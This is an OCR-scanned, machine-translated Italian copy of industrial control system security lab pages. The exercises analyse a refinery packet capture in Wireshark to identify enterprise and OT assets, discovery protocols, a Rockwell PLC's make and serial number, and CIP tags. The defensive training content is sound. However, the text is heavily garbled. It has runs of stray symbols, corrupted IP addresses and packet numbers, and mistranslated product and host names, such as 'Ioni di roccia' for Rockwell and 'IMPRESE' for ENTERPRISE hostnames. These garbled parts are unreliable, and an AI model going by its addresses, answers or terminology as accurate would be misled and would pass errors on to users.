0,0
0,1
0,0
0,0
99,9
0,1
0,0
0,0

Pacchetti F
228971
228971

232

166489

115645
10

3

31

Laboratorio 2.2-6

oH ®e OH H ®H HH HH *S * O@

nmennneenmh ® mm ® eo ® ® WW
<g! Uw Tu

io)

ov wow Ww W®

*Nota* Vediamo una varietà di protocolli di rilevamento, ma non possiamo ancora essere sicuri che siano tutti utili. Dovremo farlo
convalidare ciascuno. Ciò che vediamo finora è ARP, MDNS, LLMNR, DHCPv6, NetBIOS, DHCP e IGMP.

> Convalidare il traffico proveniente da ciascun protocollo di rilevamento per identificare quali contengono informazioni principali
> Nella vista Gerarchia protocolli fare clic con il pulsante destro del mouse > Applica come filtro > Seleziona ciascuno

Protocollo
~ Cornice
~Ethernet
~Protocollo Internet versione 6
Protocollo grammo

>

Muliicast Das oS So
Applica come filtro

~ Datagramma utente
NetBIOS Nai
~ NetBIOS Da

Ispezionare ciascuno dei protocolli di rilevamento per determinare quali hanno contenuti significativi

Preparare un filtro

Copia come CSV
Copia come YAML

~ Pacchetti percentuali

Selezionato

Non selezionato
..e Selezionato

100,0
100,0

...o Selezionato
...e non selezionato
...o non selezionato

*Nota* Non è necessario controllare l'ARP, è intrinsecamente utile collegare il MAC agli IP

{W]mdns| uns Gz: =
N. Ora __ Origine Destinazione Protocollo Lunghezza Info
92126 861.991080 169.254.223.26 224.0.6.251 MDNS 81 Query standard @x90@0 QUALSIASI DESKTOP-HGA4MU6. Locale,
+> 92127 861.991080 fe80::d92:7d9b:1b72.. FfO2::fb MDNS 101 Query standard ©x9000 ANY DESKTOP-HGA4MU6. Locale,
92130 801.997596 169.254.223.26 224.08.8.251 MDNS. 119 Risposta alla query standard 0x9800 AAAA fe8O::d92:7¢

*Nota* MDNS mostra il nome DESKTOP-HGAMU6 che è utile per 169.254.223.26

(]itimar

N. Ora Origine Destinazione Protocollo Lunghezza Informazioni
57615 522.552773 fe80::30a8:4300:f13.. FfO2::1:3 LLMNR 94 Richiesta standard ©x89de A IMPRESE
57616 522.552773 18.10.0.10 224.0.0.252 LLMNR 71 Query standard Ox89de A IMPRESE
57620 522.554370 fe80: :30a8:4300:f13.. FF02::1:3 LLMNR 91 Query standard Oxb32b AAAA IMPRESE
57623 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Query standard Oxce35 A IMPRESE
$7624 522.560369 109.10.96.10 224.0.0,.252 LLMNR 71 Query standard ©xce35 A IMPRESE
57625 522.560369 fe80: :30a8:4300:f13.. FfO2::1:3 LLMNR 91 Query standard @x0594 AAAA ENTERPRISES

*Nota* LLMNR mostra numerosi nomi host IP come 10.10.0.10 che sono ENTERPRISES

© 2021, Robert M. Lee

Lab2.2-7
Protocollo |

No. Ora “fonte ; Destinazione
| 1:356a:8135:c6a9:b939

1236 37.094066 fe80: :bc76:3047:d6ec:4697 DHCPVv6
2002 53.789764 fe80: :3deb:3fec:7d46:58d4 DHCPVv6
2013 54.799543 fese: :3deb: 3fec: 7d46: 58d4 DHCPVv6

onde 08a. = N bit: il server dovrebbe eseguire gli aggiornamenti DNS”
ae = 0 bit: il server non ha sovrascritto la preferenza S bit del client
= § bit: il server non deve eseguire aggiornamenti DNS inoltrati
Cliente un'IMPRESA2
~ Classe del venditore
Opzione: Classe Venditore (16)
Lunghezza: 14
Valore: 9000013700084d53465420352e30
ID aziendale: Microsoft (311)
dati della classe fornitore: MSFT 5.0
>> Richiesta di opzione

*Nota* Non ci concentreremo su IPv6 per ragioni di semplicità, ma questo protocollo è comunque prezioso e lo dimostra
che questo indirizzo IPv6 è ENTERPRISE2 ed è un MSFT 5.0 che significa server Windows 2000 e versioni successive.

(i{nbas
N. “Ora ____ Sorgente Destinazione Protocollo “Lunghezza. "Informazioni
19929 222.865909 16.10.10.30 10.10.255.255 NBNS. 92 Interrogazione nome NB “IMPRESE<20>
- 20732 229.001874 10.10.10.10 10.10.255.255 NBNS. 92 Richiesta nome NB VIEW-DESIGNER<ic>
20789 229.752095 10.10.10.10 10.10.255.255 NBNS. 92 Richiesta nome NB VIEW-DESIGNER<ic>
20920 230.502282 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic>
ORAM ONT KOATIA 49 49 19 410 40 10 988 98K Nene 09 Nama mary WR \V/TEWRECTANEDSA nS

*Nota* Il Name Server di NetBIOS (NBNS) è di grande valore e mostra 10.10.10.30 come ENTERPRISES come esempio

© 2021, Robert M. Lee Lab 2.2-8
Protocollo
30952 309.350648 *
: 31589 314.187004 10.10.0.50 10.10.255.255 BROWSEF
' 32431 320.738881 10.10.0.40 10.19.255.255 BROWSEF
' 37275 358.821316 10.10.10.30 10.10.255.255 BROWSEF
| 43550 408.442007 10.10.10.40 10.10.255.255 BROWSEF
Taglia: 67. : ; ;

Nome del mailslot: \MAILSLOT\BROWSE
~ Protocollo del browser Microsoft Windows
Comando: Annuncio dell'host (0x01)
Conteggio aggiornamenti: 0
Periodicità di aggiornamento: 12 minuti
Nome host: IMPRESE
Versione Windows: Windows 7 o Windows Server 2008 R2
Versione principale del sistema operativo: 6
Versione secondaria del sistema operativo: 1
Tipo di server: ©0x00011083, Stazione di lavoro, Server,
Versione principale del protocollo del browser: 15
Versione secondaria del protocollo del browser: 1
Firma: 0xaa55
Commento dell'host: Utente aziendale 3

NT Workstation, potenziale Brq

*Nota* Il servizio NetBIOS Datagram mostra alcuni nomi host come ENTERPRISE3 e FACTORY-TALK-HI e
tramite condivisioni SMB che la versione di Windows è 7 o Windows Server 2008 R2 con varie informazioni a riguardo
il sistema operativo.

ee 1ce vedi nee

Ciao] DHCP

Nessuna destinazione origine ora
Sa2de aer: 6.0.0.9
33615 330.309693 0.0.0.0 255.255.255.255
34067 333.431945 0.0.0.0 255.255.255.255
34954 340.676044 0.0.0.0 2550\255)..295 (255.
36933 356.164078 0.0.0.0 255.255.255.255
40992 388.141472 6.6.8.6 255 1.255.295.2990
41386 391.263943 0.0.0.0 255.255: 255.255
42287 398.508612 0.0.0.0 255.255.255.255
AADANE AAD OOF os es =

Biscotto magico: DHCP
» Opzione: (53) Tipo di messaggio DHCP (Scopri)
» Opzione: (61) Identificativo del cliente
~ Opzione: (12) Nome host
Lunghezza: 15

Nome host: DESKTOP-HGA4MU6

» Antinan: (fA) Identificatore della classe del fornitore

*Nota* DHCP mostra che l'indirizzo dispari 0.0.0.0 è il dispositivo Pegatron e comunica se stesso come DESKTOP-
Dispositivo HGA4MU6.

© 2021, Robert M. Lee Lab 2.2-9
Sligmp

N. ss Ora_—- ____ Sorgente 2 vedere lone ____ Lunghezza protocollo
92119 801.978987 169.254 .223.26 224.0.0.22 IGMPv3—s«éGE
92121 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66
92123 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66
92125 801.989751 169.254.223.26 224.0.0.22 IGMPv3 66
A440 GAN MRATINT AaQN AEA 199 NE ANA A A AN TOME? ehm

*Nota* Non c'è nulla di veramente utile qui in IGMP.

*Risposta* Pertanto ARP, MDNS, LLMNR, DHCPv6, NetBIOS e DHCP sono tutti protocolli di rilevamento IT utili.

4. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi host delle risorse Enterprise (L4/L5)?

10.10.0.10 — IMPRESA1
10.10.0.20 — IMPRESA2
10.10.0.30 — IMPRESE
10.10.0.40 — IMPRESA4
10.10.0.50 — IMPRESE

> Sfrutta i protocolli di rilevamento IT per identificare i dispositivi con nomi host aziendali
> Utilizza i protocolli appena esaminati per registrare nomi e indirizzi |Pv4

(®) (@) o@ eo

(W]nbns Es si eh i an ee mabe sath

N. Ora Origine Destinazione Protocollo Lunghezza Informazioni _
35353 343.503232 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic>
35422 344.253044 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<1ic>
36116 349.911127 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCD.COM<00>
36253 350.661736 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCD.COM<00>
36317 351. 412008 10.10.160.10 10.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCD.COM<00>
36429 352.212488 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCB.COM<00>
36511 352.962364 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCB.COM<00>
36617 353.712945 10.10.10.10 16.10.255.255 NBNS 92 Richiesta nome NB SF.SYMCB.COM<00>

92 Denominazione IMPRESE <20>

$7621 $22.555765 48 .10.9.10 16.10.255.255

*Nota* Se vedi qualcosa di duplicato (cioè due IP diversi che trasmettono che sono un nome host specifico,

sfruttando gli altri protocolli di rilevamento e osservando i modelli di traffico come se il dispositivo lo fosse
comunicare o meno sui protocolli ICS può aiutare a deduplicare questi problemi

> Sfrutta l'indirizzamento IPv4 in combinazione con i nomi host
> L'indirizzamento IPv4 segue uno schema che diventa ovvio con i nomi host

© 2021, Robert M. Lee Lab 2.2-10

eo fF ® © &® & Oh ww

ohm

o fF @ @

@

@,
py Bp

io

noi w Ww Dp Ww

ahi

noi ww

wo w Ww

oe ww ww

ww ww

)

C

‘

Ethernet-27 | IPv4-23 | IPve

'Indirizzo 7 pacchetti per byt
0.0.0.0 36

| 10.10.0.10 8
-10.10.0.202
10.10.0.30 2
10.10.0.40 2

) 10.10.0.50 4
10.10.10.10 79
10.10.10.20 59.848 6,

*Risposta* Le risorse Enterprise hanno tutte l'indirizzo 10.10.0.X che includerebbe
10.10.0.10 — IMPRESA1
10.10.0.20 — IMPRESA2
10.10.0.30 — IMPRESA3
10.10.0.40 — IMPRESA4
10.10.0.50 — IMPRESE

*Nota* ENTERPRISES viene visualizzato su un paio di IP diversi ed è il NetBIOS Datagram Service che aiuta
identificare l'indirizzo IP .50 come quello delle IMPRESE effettive

5. Quali sono gli indirizzi IP e (se disponibili) quali sono i nomi dei tubi delle risorse OT (L3 e inferiori)?

10.10.10.10 — VIEW-DESIGNER (Visualizza Designer)

10.10.10.20 — FACTORY-TALK-VI (Vista Factory Talk)

10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer)
10.10.10.40 — FACTORY-TALK-HI (Storico del discorso in fabbrica)
10.10.20.10

10.10.20.20

10.10.20.40

10.10.20.50

20.10.20.10

20.10.40.10

> Sfrutta i protocolli di rilevamento IT per identificare i dispositivi che hanno nomi host non aziendali
> Seguire lo stesso procedimento della domanda precedente eliminando i noti Enterprise Ips

Informazioni sulla lunghezza del protocollo di destinazione di origine
20920 230 .502282 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<1ic>
28160 287.594735 19.18.10-10 10.10. 255. 255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic>
28285 288. 345950 10.10.10.10 10.10.255.255 NBNS 92 Richiesta nome NB VIEW-DESIGNER<ic>

© 2021, Robert M. Lee Lab 2.2-11
3 SS e
49550 408442007". 10.10.10..40 19.19.255.255 BROWSER. 265 Annuncio host FACTORY-TALK-HI, '
= 1319..1126.231278 10.10.10.40 10.10. 255.255 BROWSER 265 Annuncio host FACTORY-TALK-HT,

Versione Windows: Windows 7 o Windows Server 2008 RZ
Versione principale del sistema operativo: 6
Versione secondaria del sistema operativo: 1
» Tipo di server: 0x@0011003, workstation, server, workstation NT, browser potenziale
Versione principale del protocollo del browser: 15
Versione secondaria del protocollo del browser: 1
Firma: @xaa55

Commento del presentatore: Storico di Factory Talk

> Sfrutta le conversazioni per identificare chi sta comunicando sulle porte ICS
> Visualizza statistiche > Conversazioni
> Passare alla scheda TCP
© I sistemi operatore comunicano con le porte ICS sui controller

Guida agli strumenti wireless di telefonia
Cattura proprietà file Ctrl+Alt+Maiusc+c
Indirizzi risolti

Gerarchia dei protocolli

Conversazioni
Endpoint
Lunghezze dei pacchetti

Pac

3.336 mila
10.10.10.20 54741 10.10.20.50 44818 29.882 3.336k
| 10.10.20.10 44818 10.10.10.30 1511 25.051 5.621k
| 10.10.20.10 44818 10.10.10.30 1746 61.683 10 milioni
10.10.20.20 54741 10.10.20.10 44818 29.827 3.330k
/10.10.20.20 54741 10.20.20.10 44818 55 6.084
| 10.10.20.40 54741 10.10.20.10 44818 29.827 3.330k
10.10.20.40 54741 10.20.40.10 44818 55 6.084
!10.10.20.50 44818 10.10.10.30 1746 20.589 3.546k
10.10.20.50 44818 10.10.10.30 1336 1.230 129k
/10.10.20.50 44818 10.10.10.30 2157 222 40k
20.10.20.10 44818 30.10.10.10 1746 42 6.813
/20.10.40.10 44818 10.10.10.30 1746 42 6.813

© 2021, Robert M. Lee Lab 2.2 -12

»@mememneneen#enrn mf”, * mm ™

sono un

anno Domini
"Www."

wo ww ww noi Ww | Ww Ww WH WH Ww noi Ww Ww wa DB noi WD Ww ww

*Nota* La porta 44818 è una porta ICS per EtherNet/IP e si trova sul controller. Quindi possiamo dirlo
10.10.10.20 è un sistema operatore (ad esempio HMI o EWS) che comunica con 10.10.20.10 come controller (ad esempio PLC).

Risorse con EtherNet/IP:

10.10.20.10
10.10.20.50
20.10.20.10
20.10.40.10

*Nota* L'identificazione dei sistemi che comunicano con le porte ICS può aiutare a identificare le stazioni operatore come
esempio 10.10.10.30 comunica con 10.10.20.10 su 44818.

*Nota* I sistemi non Enterprise seguono lo schema IP di 10.10.10.x per L3 (stazioni operatore) e
10.10.20.x e 10.20.x.x per L2 (controller).

*Risposta* Gli asset L3 e L2 sono:

10.10.10.10 — VIEW-DESIGNER (Visualizza Designer)
10.10.10.20 — FACTORY-TALK-VI (Vista Factory Talk)
10.10.10.30 - ENG_WORKSTATION (Studio 5000 Logix Designer)
10.10.10.40 — FACTORY-TALK-HI (Storico del discorso in fabbrica)
10.10.20.10

10.10.20.20

10.10.20.40

10.10.20.50

20.10.20.10

20.10.40.10

6. Quale fornitore ICS produce il PLC? Rockwell
> Filtrare su uno qualsiasi degli indirizzi IP del controller
> Filtra per ip.addr==10.10.20.10

o I PLC sono tutti realizzati dallo stesso fornitore
> Determinare il fornitore dall'indirizzo Ethernet

© 2021, Robert M. Lee Lab 2.2 -13
(W[ipaddr=210.10.20.10_

| Elenco dei pacchetti ~| | Stretto e largo » |_| Maiuscole/minuscole | Corda
Newsies sal IM Ooo OUR ea = Destinazione
| 90162 786.067827 10.10.20.10 10.10.10.30
| 90163 786 .076708 10.10-20-10 10.10.10.30
| 90165 786.079781 10.10.20.10 10.10.10.30
OnATA Quando viene annunciato AM AN AM AM AN AN AN 9M

» Frame 90163: 591 byte sul cavo (4728 bit), 591 byte catturati (4)
~ Ethernet II, Src: Rockwell_5a:72:ce (00:00:bc:5a:72:ce), Dst: Del:
> Destinazione: Dell_3c:53:0b (f8:db:88:3c:53:0b)

Fonte: Rockwell 5a:72:ce (00:00:be:5a:72:ce)
Tipo: IPv4 (@x0800)

*Rispondi* Rockwell

Identificare le risorse e capire come appare la rete, come è connessa e quali risorse
comunicare tra loro è il primo passo per raggiungere la sicurezza. Gli strumenti e i processi di difesa lo sono
estremamente limitato quando non capisci cosa stai cercando di difendere. Individuazione dei beni e
visualizzare una rete può sembrare scoraggiante se vista nel contesto dell'intera rete.

© 2021, Robert M. Lee Lab 2.2-14

ov 8

aee ee eee ee

=»

a > > > mh oH HD ® ®

——
iw

ae Ww Ww Ww Ww Jw |S Ww YS WD WD Ww WD W

_Laboratorio 2.3 - Analisi del protocollo ICS

Obiettivi s

e = Identificare informazioni aggiuntive sui controller che sfruttano i protocolli ICS

*Informazioni sullo scenario* Nel contesto dello scenario, abbiamo una cattura di base dalla raffineria di Calistoga.
Come team di sicurezza dobbiamo analizzare l'acquisizione per determinare eventuali informazioni identificative sulle risorse che
ci aiuterà a capire il loro contesto e i loro ruoli. A questo punto esaminiamo le normali comunicazioni dell'
i protocolli ICS per estrarre ulteriori informazioni sulle risorse.

Preparazione agli esercizi

Questo laboratorio utilizzerà la VM RELICS. Sul desktop della VM è presente una cartella identificata come /CS515. Dentro,
c'è la cartella calistogarefinery e poi la cartella pcaps che contiene l'acquisizione del pacchetto
normalops.pcap che verrà utilizzato durante questo laboratorio.

1. Quale protocollo ICS è presente nell'acquisizione?

2. Quale protocollo è in esecuzione in alcune sessioni con CIP?

3. Qual è la marca, il modello e il numero di serie del PLC al 10.10.20.10?

4. Di che tipo di funzione/sistema di sicurezza fa parte 10.10.20.50?

5. Quali sono alcuni dei tag visualizzabili nelle comunicazioni del 10.10.20.50?

6. Quante parole è la dimensione del percorso della richiesta per TimerDelay con 10.10.20.50 come destinazione?

© 2021, Robert M. Lee Lab 2.3-1
Attività: identificare gli indirizzi Ethernet, gli indirizzi IP e i protocolli ICS in small_baseline.pcap

1. Quale protocollo ICS è presente nell'acquisizione? EtherNet/IPCIP

> Avvia la tua VM RELICS
> Accedi alla VM
> ACCEDI =reliquie
> PASSWORD = reliquie

> Apri normalops.pcap in Wireshark

> Aprire la cartella ICS515 situata sul desktop e quindi accedere a calistogarefinery > pcaps
> Fare doppio clic su normalops.pcap per aprire il file in Wireshark

Gt Home Desktop 1CS515 calistogarefinery pcaps + Oe 2 = = o x

x Stella modificata
> Recenti:

* incidente.pca 196,4 MB 2348 otk
%& Speciale un ms °
() Home normalops.pcap 37,1 MB 23:39 oe
(1 Desktop eee

(=) Documenti

Te ee Ws

> Identificare i protocolli univoci nel traffico
> Nella parte superiore del pannello Wireshark, fai clic su Statistiche
> Fare clic su Gerarchia protocolli
> Identificare i protocolli ICS

Analizza la telefonia _Guida degli strumenti wireless _
Cattura proprietà file Ctrl+Alt+Maiusc+c

Indirizzi risolti

Gerarchia dei protocolli

Conversazioni

Endpoint

Lunghezze dei pacchetti

Grafico 1/O

Tempo di risposta del servizio |

10.10. 2(

© 2021, Robert M. Lee Lab 2.3-2

aw @®) (@) (®)

Rneneemnemnmenenemnn#it#nn*nh)n *f» *) * * ®
oh a

sì

sì

sì

‘Con ‘Be iB’ 4B’ ip’

<B'

} Protocols sss ais suai sitet ___* Percent Packets _— Packets
: ied Frame 100.0 228971
) ~ Ethernet 100.0 228971
~ Protocollo Internet versione 6 0.1 288
L » Protocollo datagramma utente 0.1 274
’ Multicast Domain Name System 0.0 4
) Risoluzione dei nomi multicast link-local 0.0 12
) DHCPVv6 0.1 244
b) Dati 0,0 14
2 Protocollo dei messaggi di controllo Internet v6 0.0 14
3 » Protocollo Internet versione 4 $ 9,9 228632
a » Protocollo datagramma utente 0.1 232
1 Servizio nomi NetBIOS 0.0 29
~ Servizio datagramma NetBIOS 0.0 21
g ~ SMB (Server Message Block Protocol) 0.0 21
~ Protocollo MailSlot SMB 0.0 21
Protocollo browser Microsoft Windows 0.0 21
Sistema di nomi di dominio multicast 0.0 4
) Risoluzione dei nomi multicast locale del collegamento 0,0 8
q EtherNet/IP (protocollo industriale) 0,0 52
Protocollo di configurazione host dinamico 0.0 36
Dati 0,0 82
»Protocollo di controllo della trasmissione 99.7 228387
4 ~ EtherNet/IP (protocollo industriale) 72.7 166521
~ Protocollo industriale comune Ted 166489
~ Gestore connessione CIP 0.9 2079
Pacchetto non valido 0.0 16
Classe CIP Generico 50,5 115645
Protocollo di gestione del gruppo Internet 0.0 10
Protocollo messaggi di controllo Internet 0.0 3
Protocollo di risoluzione degli indirizzi 0.0 51

*Risposta* Il protocollo ICS immediatamente evidente è EtherNet/IP CIP

2. Quale protocollo è in esecuzione in alcune sessioni con CIP? PCCC

*Nota* Continua dall'ultimo passaggio

*Nota* Ci saranno protocolli che Wireshark non analizza, tuttavia in questo caso stiamo solo cercando di vedere
se è in uso un altro protocollo integrato nel CIP. Esistono diversi modi per identificare il protocollo ma
il punto più semplice da cui iniziare è cercare tutto ciò che sembra fuori posto

> Filtra per pacchetto non valido
> In Gerarchia protocolli selezionare il pacchetto malformato
> Applica come filtro > Selezionato
> Analizzare le comunicazioni cercando tutto ciò che risalta

© 2021, Robert M. Lee Lab 2.3-3
Dati —yar- Bz
»Protocollo di controllo della trasmissione 99.7 22838
~ EtherNet/IP (protocollo industriale) a & 166521

~ Protocollo industriale comune 72.7 166489

~ Gestore della connessione CIP
Pacchetto non valido

Applica come filtro selezionato

Non selezionato
...e selezionati

—o

Protocollo di destinazione

1312 .946233 19.10.10,39 CIP PCCC
| 1588... 1336 .887681 16.10.20.10 10.10.10.30 CIP PCCC 102
1626... 1360.821953 19.10.20.10 16.16.10.30 cIP Pccc 102

. 1396.709656 10.10.20.10 10.10.10.30 CIPPCCCc
4g 19 20 10° 1p 19 19 20 pp

Oggetto CIP PCCC
» Servizio: Servizio sconosciuto (0x52) (Risposta)

~ [Informazioni esperto (errore/formato non valido): pacchetto non valido (si è verificata un'eccezione)]
[Pacchetto non valido (si è verificata un'eccezione)]

[Livello di gravità: errore]

[Gruppo: formato non valido]

*Risposta* PCCC è un protocollo che sfrutta il CIP ed è spesso associato ai PLC Rockwell, il che ha senso

nel nostro ambiente.
3. Qual è la marca, il modello e il numero di serie del PLC al 10.10.20.10?

Rockwell Automation/Allen-Bradley

1756-L55/A e 1756-M12/A LOGIX5555

0x0019c114
> Filtra per l'indirizzo IP del PLC
> Inserisci il filtro ip.addr==10.10.20.10

(WJip.addr==10.10.20.10 a
N. _Tempo SOUECR = 5 5 i Destinazione _ Protocollo _ Lunghezza | Informazioni. X -
| "857.1312.928917 ~ 10.10.20.40 10.10.20.10 cIP 116 'DP7Running' - Servizio (@x4

1557... 1312.934433 10.19.20.10 10.10.20.40 cIP 107 Successo: 'DP7Running' - Ser

1557... 1312.934729 _10.10.20.40 10.10.20.10 cIP 114 'pp7Start' - Servizio (@x4c)

. 1312.935881 10.10.20.10 10.18.10.30 TCP 60 44818 ~ 1746 [ACK] Seq=8718

. 1312.940368 10.10.20.10 10.10.20.40 cIP 107 Successo: 'DP7Start' - Servi

. 1312.940618 10.10.20.40 10,.10.20.10 cIP 114 'DP7Time' - Servizio (@x4c)
© 2021, Robert M. Lee Lab 2.3-4

eo« & &

eo)

nnn em mh) mm™
0 ee ee ee ee ee

@me@ne®

nmamma
(py 'ey ip (eg ig' 'sg! ts) (a

ip

«se.»

J

ws AS ws ww ws Vedi es

*Nota* Possiamo vedere che l'indirizzo IP 10.10.20.10 sta comunicando con una coppia di indirizzi IP incluso .40
e .30 oltre CIP. Esistono numerosi modi per trovare le comunicazioni anche semplicemente controllando velocemente le “Info”
bloccare. Poiché si tratta di un'acquisizione abbastanza pulita, possiamo scorrere verso l'alto e iniziare da lì.

> Scorri fino alla parte superiore di Wireshark e identifica eventuali funzioni di identità o attributi

4 0.005754 10.10.10.20 10.18.20.10 ENIP 82 Registro Sessione (Req), Sessione
5 0,007637 ENIP 82 Registro Sessione (Rsp), Sessione:
ENIP 78 Elenco Identità (richiesto)

é q 310. 129 Elenco Identità (R5p),-1756-ENBT/A
8 8.010802 16.10.10. 26 10.16.20.10 CIP CM 114 Non connesso Invia: Identità - Ottieni attributi Tutti
9 8.617643 16.10.26.10 10.16.16.20 cIP 'Swng, 144 Successo: Identità - Ottieni tutti gli attributi

*Nota* Vediamo che esiste sia un comando List Identity (richiesta e risposta) che un comando Identity — Ottieni tutti gli attributi
leva. Sono ottimi per esaminare e identificare se le informazioni sono rilevanti. Anche l'identità della lista prende nota
le informazioni che il dispositivo è un 1756-ENBT/A. Il più prezioso sarà Ottieni attributi che lo faranno
comunicare tutto ciò che si sa sul dispositivo.

9 0.817643 144 Successo: Identità - Ottieni attributi Ail

10 0.017940 46 Gestisci connessione! grande Inoltra aperto (router di messaggi)

11 6.920693 ‘ 3 se 98 Servizio non supportato: Connection Manager - Large Forward Op
12 8.828992 -18.10. 19.18.20.10 Gestore connessione CIP cM 142 - Inoltra apertura (router di messaggi)

13 8.630459 10.19.28.10 19.18.16.20 cIP cM 124 Operazione riuscita: Connection Manager - Inoltra aperto

14 6.030683 19.10.16. 20 19.10.20.10 Classe cIP 412 (8x64) - Ottieni elenco attributi

15 9.034686 10,19.28.10 10.19.10.20 cIP 143 Successo: Classe (@x64) - Ottieni elenco attributi

ID fornitore: Ioni di roccia/Allen-Bradley (0x0901)
+ Attributo: 2 = 2)

Tipo di dispositivo: P: controller logico programmabile (@x008e)
~ Attributo: 3 (Codice Prodotto)
Codice prodotto: 51
» Attributo: 4 (Revisione)
Revisione principale: 16
Revisione minore: 21
> Attributo: 5 (Stato)
» Stato: 0x3160
~ Attributo: 6 (numero di serie)
Numero di serie: 4
+ Attributo: 7 (Prome oy

Nome prodotto: 1756-155/A 1756-M12/A LOGIX5S55

*Risposta* Il dispositivo è un Rockwell Automation / Allen-Bradley (marca), 1756-L55/A e 1756-M12/A
LOGIX5555 (modello), con numero di serie 0x0019c114. Probabilmente sono presenti 2 moduli 1/O in questo PLC (L55 e M12).
4. Di che tipo di funzione/sistema di sicurezza fa parte 10.10.20.50? Sistema di Sicurezza Gestione Bruciatore

*Nota* A volte è semplice come analizzare il flusso di comunicazioni per identificare le informazioni su
dispositivo.

> Filtra per l'indirizzo IP del PLC
> Inserisci il filtro ip.addr==10.10.20.50

> Segui i flussi TCP per trovare qualcosa di utile

> Fare clic con il pulsante destro del mouse sul primo pacchetto della sessione
> Segui > Flusso TCP

© 2021, Robert M. Lee Lab 2.3-5
"Destinazione

Informazioni sulla lunghezza del protocollo.
a 66 $4741 — 448

3695 80.900000

Seleziona/Deseleziona pacchetto Ctrl4M

3607 80.001608 -10. Ignora/Non ignora il pacchetto Ctrl+D 54 54741 + 448
| 3608 80.005754 ; P 82 Registro Se
| 3609 80 087637 Imposta/Disimposta riferimento temporale Ctrl+T é Visto ierenise

3610 80.007818 Time Shift... Ctrl+shift+T jp 78 Elenco Identi

3611 80.009800 Commento pacchetto... Ctrl+Alt+c Pp 129 Elenco Identi

3612 80.010002 " err rman ———) OM 114 non connesso

3613 80.017643 109.10.20.50 WvedName — 444 Successo: ID

3614 80.017940 19.10.19.20 | applica come Filtro cM 146 Connessione

3615 80.020693 1 20,50 . cM 98 Servizio no

3616 80.020992 10. .20 Predisposizione come Filtro > Attacco cm 142

3617 86.030459 10.10. Filtro conversazione +) CM 124 Successo: Co

3618 8.030683 10.10.10> Colosize Coiwersation ‘ 112 Classe (0x64

3619 80.034686 10.10.20.— 143 Successo: Cl

Frame 3605: 66 byte sul cavo (528

>—
» Ethernet II, Origine: Dell_3c:53:0a (Stream TCP Ctrl+Alt+Maiusc+T |
>:7

>

Internet Penne Neloey 4 artes Copia 'DP stréam ctrl Sh ’ |

| Preferenze protocollo »

-DP16Ora. .db
. D.

. .DP12Timer..
-P12Time..dO...... an Vedi eee err es Pilevel...F..<....S.D..

A_1ATimaNelaw Von a e DADunnina he an

*Risposta* L'apparecchio si presenta come parte del Sistema di Sicurezza Gestione Bruciatore

5. Quali sono alcuni dei tag visualizzabili nelle comunicazioni del 10.10.20.50? TimerDelay, Livello, Avvio, ecc.
*Nota* Continuando dall'ultima domanda

*Nota* Possiamo rivedere il flusso TCP e vedere un numero di tag nel traffico. I tag sono rappresentazioni di
i dati di processo. Ad esempio, un HMI o uno storico avrebbero un tag per "Tempo" o "Temperatura" o altro
valori importanti per il processo e quindi mostrare i dati effettivi accanto ad essi. A volte i tag possono essere visti nel file
traffico di rete direttamente (ma non sempre).

*Risposta* TimeDelay, Timer, TimerDelay, Level, Start e Running sono tutti tag.

© 2021, Robert M. Lee Lab 2.3-6

*)

8 a 8 ss 8 a 2 ee SS ee
ww Ti aT ie oT ig a Te

Le'

come ty oY era se se

6. Quante parole è la dimensione del percorso della richiesta per TimerDelay con 10.10.20.50 come destinazione?
8

*Nota* I percorsi delle richieste sono la posizione sul dispositivo in cui vengono archiviate le informazioni e spesso sono istruttivi sui valori
è possibile modificare sul controller con lettura/scrittura.

*Nota* Devi considerare l'indirizzo IP .50 come destinazione

> Continuando dall'ultima domanda rivedi le Info delle comunicazioni finché non vedi TimerDelay
valori
> Selezionare un pacchetto TimerDelay
> Esaminare i dati CIP

Lui 22574 243.163374 10:.18.19.29 10:10, 20.50. CIP 129 "opgTimerDelay" - Servizio (Ox4c)
+- 22575 243.168614 18.10.20.50 10.10.10.20 cIP 12i accesso: 'DP9TimerDelay' - Servizio
22576 243.169207 10.10.10.20 10.10.20.50 cIP "P1' - Servizio (x4c)

22577 243.174167 10.16.20.50 10.10.10.20 cIP 87 Successo: 'P1' - Servizio (@x4c)
22578 243.174425 10.18.10.20 10.16.20.50 cIP 1160 'P10' - Servizio (6x4c)
22579 243.179743 10.10.20.50 10.10.10.20 cIP 107 Successo: 'P10' - Servizio (@x4c)
22580 243.180072 10.16.10.20 10.10.20.58 cIP 114 'Pi@Level' - Servizio (@x4c)
| 22581 243.185256 16.10.20.58 10.10.10.20 cIP 110 Operazione riuscita: 'PiOLevel' - Servizio (@x4
| 22582 243.185590 10.10.10.20 10.10.20.50 cIP 111 'P1' - Servizio (@x4d)
| _22585 243.191236 10.10.20.50 10.10.10.26 ciP 104 Successo: 'Pi' - Servizio (0x4d)

» Protocollo industriale comune
» Servizio: Servizio sconosciuto (@x4c) (Richiesta)
eo = Richiesta/Risposta: Richiesta (x0)
.10@ 1100 = Servizio: Sconosciuto (0x4c)
Dimensione del percorso richiesta: 8 parole
» Percorso della richiesta: DP9TimerDelay
> Segmento di percorso: @x91 (segmento di simboli estesi ANSI)
100. .... Tipo di segmento di percorso: Segmento dati (4)
...1 9901 = Tipo di segmento dati: Segmento simbolo esteso ANSI (17)
Dimensione dati: 13 byte
Simbolo ANSI: DP9TimerDelay

wu

*Rispondi* 8

*Nota* Puoi anche ottenere questa risposta rapidamente in tshark utilizzando il seguente filtro:
tshark -r normalops.pcap -Tfields -e cip.request_path_size
